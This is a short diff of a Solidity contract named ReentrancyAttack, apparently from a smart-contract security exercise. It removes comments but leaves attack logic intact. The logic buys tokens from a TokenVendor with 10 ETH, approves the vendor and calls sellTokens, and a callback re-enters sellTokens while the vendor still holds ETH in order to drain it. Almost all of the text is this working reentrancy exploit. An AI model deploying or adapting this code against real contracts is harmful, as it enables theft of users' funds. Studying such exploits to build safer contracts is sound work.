@@ -20,21 +20,14 @@ contract ReentrancyAttack {
 
         if (vendorHasEth && iHaveTokens) {
             counter -= 1e18;
-            vendor.sellTokens(1e18); // Adjust the amount to sell based on the counter
+            vendor.sellTokens(1e18);
         }
     }
 
     function run() external payable {
-        // Buy tokens from the TokenVendor with 10 ETH
         vendor.buyTokens{value: 10 ether}();
-
-        // Get the balance of tokens this contract has
         counter = token.balanceOf(address(this));
-
-        // Approve the TokenVendor to spend tokens on behalf of this contract
         token.approve(address(vendor), 10 * 1e18);
-
-        // Attempt to sell tokens, which will trigger the reentrancy attack
         vendor.sellTokens(1e18);
     }
 }
